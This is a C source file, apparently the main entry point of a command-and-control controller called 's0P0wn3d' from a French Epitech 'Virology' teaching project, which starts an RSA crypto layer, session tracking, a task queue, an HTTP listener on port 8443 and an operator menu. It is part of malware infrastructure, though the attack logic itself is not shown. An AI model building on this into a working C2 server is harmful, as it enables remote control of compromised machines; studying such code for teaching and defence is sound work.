/*
 * s0P0wn3d — Point d'entrée du contrôleur C2.
 *
 * Initialise la crypto, les sessions, la file de tâches, puis démarre
 * le serveur HTTP en thread et lance le menu CLI.
 *
 * Usage: ./s0p0wn3d_controller [port]
 *   port par défaut: 8443
 */

#include "crypto.h"
#include "sessions.h"
#include "task_queue.h"
#include "http_server.h"
#include "cli.h"
#include "../shared/protocol.h"

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <pthread.h>
#include <unistd.h>

static int should_exit = 0;

static void sig_handler(int sig) {
    (void)sig;
    printf("\n[*] Arrêt du contrôleur...\n");
    should_exit = 1;
    crypto_cleanup();
    sessions_cleanup();
    exit(0);
}

/* Thread pour le serveur HTTP */
static void *http_server_thread(void *arg) {
    int port = *(int *)arg;
    http_server_start(port);
    return NULL;
}

int main(int argc, char *argv[]) {
    int port = S0P_CONTROLLER_PORT;
    pthread_t http_thread;

    if (argc > 1) {
        port = atoi(argv[1]);
    }

    printf("╔══════════════════════════════════════════╗\n");
    printf("║   s0P0wn3d C2 Controller v%s           ║\n", S0P_VERSION);
    printf("║   Projet Epitech Virology — Pédagogique   ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");

    /* Signal handlers */
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    /* Initialiser la crypto (RSA) */
    if (crypto_init("keys") != 0) {
        fprintf(stderr, "[-] Échec de l'initialisation crypto\n");
        return 1;
    }

    /* Initialiser les sessions */
    sessions_init();

    /* Initialiser la file de tâches */
    task_queue_init();

    /* Démarrer le serveur HTTP en arrière-plan */
    printf("[*] Démarrage du serveur HTTP sur le port %d...\n\n", port);
    if (pthread_create(&http_thread, NULL, http_server_thread, &port) != 0) {
        fprintf(stderr, "[-] Impossible de créer le thread HTTP\n");
        crypto_cleanup();
        return 1;
    }

    /* Pequit delay pour que le serveur démarre */
    sleep(1);

    /* Lancer le menu CLI */
    cli_menu();

    return 0;
}
